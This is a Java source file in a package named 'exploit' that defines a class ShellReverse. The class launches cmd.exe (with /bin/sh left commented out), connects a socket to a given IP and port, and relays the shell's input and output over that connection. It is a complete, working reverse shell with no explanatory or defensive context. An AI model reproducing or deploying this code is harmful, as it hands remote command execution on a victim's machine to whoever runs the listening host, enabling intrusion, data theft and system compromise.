/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package exploit;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

/**
 *
 * @author legend
 */
public class ShellReverse {
    
    private String host;
    private int port;
    private String cmd;
    private Process p;
    private Socket s;

    public ShellReverse(String IP, int port) 
    {
        p = null;
        s = null;
        this.host = IP;
        this.port = port;
        //this.cmd = "/bin/sh";
        this.cmd = "cmd.exe";
    }

    public String getHost() {
        return host;
    }

    public int getPort() {
        return port;
    }

    public void setHost(String host) {
        this.host = host;
    }

    public void setPort(int port) {
        this.port = port;
    }
            
    public void executeShellReverse()
    {        
        try {
            
            this.p = new ProcessBuilder(this.cmd).redirectErrorStream(true).start();
            this.s = new Socket(this.host,this.port);
            
            InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
            OutputStream po=p.getOutputStream(),so=s.getOutputStream();
            
            System.out.println("Open..");
            while(!s.isClosed()) {
                
                while(pi.available()>0)
                  so.write(pi.read());
                while(pe.available()>0)
                  so.write(pe.read());
                while(si.available()>0)
                  po.write(si.read());
                
                so.flush();
                po.flush();
                
                try 
                {
                    Thread.sleep(50);
                } catch (InterruptedException ex) {}
                
                try 
                {
                  p.exitValue();
                  break;
                }
                catch (Exception e){}
          
            }
            System.out.println("Close");
            
        } catch (IOException ex) {}        
        
        closeConnection();
         
    }
    
    public void closeConnection()
    {
        try {            
            this.p.destroy();
            this.s.close();
        } catch (IOException ex) {}
    }
    
   
    
}
